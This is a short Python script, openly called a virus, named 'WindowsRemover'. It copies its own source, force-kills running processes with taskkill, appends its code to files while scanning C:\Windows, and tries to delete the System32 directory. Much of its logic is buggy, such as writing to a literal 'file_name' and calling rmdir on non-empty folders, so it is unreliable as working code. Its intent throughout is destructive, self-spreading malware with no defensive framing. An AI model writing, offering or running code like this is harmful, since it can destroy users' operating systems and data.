import os
import time
import subprocess
import struct


def WindowsRemover():
    print("Started Windows Remover ...")

    # Open and Copy The Virus Code
    virus_file = open("WindowsRemover.py", "r")
    virus_code = virus_file.read()
    virus_file.close()
    print("Cloned The Virus ! \n")

    # Create The Sub Folders In Main Drive Directories

    # Check Live Processes
    print("Closing Apps ...")
    data = subprocess.check_output(['wmic', 'process', 'list', 'brief'])
    process = str(data)
    try:
        for i in range(len(process)):
            print(process.split("\\r\\r\\n")[i])
    except IndexError as e:
        print("Done !")

    # Kill Live Processes
    while True:
        subprocess.call(["taskkill", "/F", "/IM", process])
        break

    # Scan System Directories
    print("Containing Directories : \n")
    for file_name in os.listdir('C:\Windows'):
        print(file_name)

        # Split Virus Code Throw Folders Files
        if file_name.endswith(".txt") or file_name.endswith(".py"):
            file = open("file_name", "a")
            file.write(virus_code)
            file.close()

    # Check Victim User System Type
    system = struct.calcsize("P") * 8

    if system.__eq__(32):
        final32 = os.rmdir('C:\Windows\System32')

    else:
        final64 = os.rmdir('C:\Windows\System64')


WindowsRemover()
